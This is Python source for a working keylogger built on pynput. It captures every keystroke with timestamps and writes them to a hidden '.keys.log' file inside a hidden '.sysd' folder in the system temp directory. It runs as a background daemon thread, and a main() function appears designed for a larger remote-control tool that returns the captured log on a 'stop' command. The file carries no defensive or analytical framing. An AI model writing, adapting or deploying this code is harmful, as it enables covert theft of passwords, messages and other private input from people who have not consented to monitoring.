import os
from datetime import datetime
from pynput import keyboard
import threading
import time
import tempfile
import platform

# Cross-platform temp directory
log_dir = os.path.join(tempfile.gettempdir(), ".sysd")
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, ".keys.log")

class KeyLogger:
    def __init__(self):
        self.listener = None
        self.listener_thread = None
        self.stop_flag = threading.Event()
        self.file_lock = threading.Lock()
        self.log_buffer = []
        self.buffer_size = 50  # Number of keystrokes before writing to file
        self.last_write_time = time.time()

    def write_to_file(self):
        with self.file_lock:
            try:
                mode = 'a' if os.path.exists(log_file) else 'w'
                with open(log_file, mode, encoding='utf-8') as f:
                    f.write(''.join(self.log_buffer))
                self.log_buffer = []
                self.last_write_time = time.time()
            except Exception as e:
                print(f"File write error: {e}")

    def on_press(self, key):
        try:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            if hasattr(key, 'char'):
                log_entry = f"{timestamp}: {key.char}\n"
            else:
                log_entry = f"{timestamp}: {key}\n"
            
            self.log_buffer.append(log_entry)
            
            # Write to file if buffer is full or 5 seconds passed
            if (len(self.log_buffer) >= self.buffer_size or 
                time.time() - self.last_write_time > 5):
                self.write_to_file()
                
        except Exception as e:
            print(f"Keylog error: {e}")

    def start_keylogger(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        print(f"[+] Keylogger started. Logging to: {log_file}")
        while not self.stop_flag.is_set():
            time.sleep(0.1)
        
        # Final write before stopping
        if self.log_buffer:
            self.write_to_file()
            
        self.listener.stop()
        print("[!] Keylogger stopped.")

    def stop_keylogger(self):
        self.stop_flag.set()
        time.sleep(1)  # Allow thread to finish
        
        if not os.path.exists(log_file):
            return "[!] No log found."
        
        try:
            with self.file_lock:
                # Read content
                with open(log_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                # Clear the file
                # open(log_file, 'w').close()
                
                return content
        except Exception as e:
            return f"[!] Error handling log file: {e}"

# Singleton instance
keylogger = KeyLogger()

def main(command=None):
    if command == "stop":
        return keylogger.stop_keylogger()
    
    keylogger.stop_flag.clear()
    keylogger.listener_thread = threading.Thread(
        target=keylogger.start_keylogger, 
        daemon=True
    )
    keylogger.listener_thread.start()

if __name__ == "__main__":
    main()